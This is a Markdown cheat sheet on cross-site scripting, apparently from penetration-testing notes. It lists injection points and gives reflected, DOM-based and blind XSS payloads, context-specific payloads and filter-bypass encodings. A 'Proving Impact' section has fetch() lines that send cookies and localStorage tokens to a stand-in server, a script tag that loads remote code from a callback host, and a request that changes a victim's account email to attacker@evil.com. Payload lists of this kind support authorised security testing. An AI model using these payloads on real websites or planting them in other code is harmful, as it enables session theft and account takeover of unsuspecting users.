---
title: "Cross-Site Scripting (XSS)"
---

## What It Is

XSS lets you execute JavaScript in another user's browser. Impact ranges from cookie theft to full account takeover, depending on context.

## Where to Look

- Search fields, URL parameters reflected on the page
- User profile fields (name, bio, address)
- Comments, reviews, messages
- Error messages that reflect input
- URL fragments used by client-side JS
- File upload names displayed back
- HTTP headers reflected in responses (Referer, User-Agent)

## Testing

```bash
# Basic reflected XSS probes — try in every input
<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)

# DOM-based — check URL fragments
https://<TARGET>/page#<img src=x onerror=alert(1)>

# Blind XSS — use a callback payload
"><script src=https://YOUR-CALLBACK-SERVER/x.js></script>
```

## Context-Specific Payloads

```
# Inside HTML attribute
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="

# Inside JS string
'-alert(1)-'
';alert(1)//
\'-alert(1)//

# Inside JS template literal
${alert(1)}

# URL context
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

## Filter Bypasses

```
# Case variation
<ScRiPt>alert(1)</sCrIpT>

# Without parentheses
<img src=x onerror=alert`1`>

# Without alert
<img src=x onerror=prompt(1)>
<img src=x onerror=confirm(1)>

# Event handlers without brackets
<details open ontoggle=alert(1)>

# Encoding
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

# Double encoding
%253Cscript%253Ealert(1)%253C/script%253E
```

## Proving Impact

Don't just show `alert(1)` — demonstrate real impact:

```javascript
// Cookie theft
fetch('https://YOUR-SERVER/?c='+document.cookie)

// Session token exfil
fetch('https://YOUR-SERVER/?t='+localStorage.getItem('token'))

// Account takeover via API
fetch('/api/user/email', {method:'PUT', headers:{'Content-Type':'application/json'}, body:'{"email":"attacker@evil.com"}'})
```

## Findings

| Endpoint | Type | Payload | Impact | Status |
|----------|------|---------|--------|--------|
| | | | | |
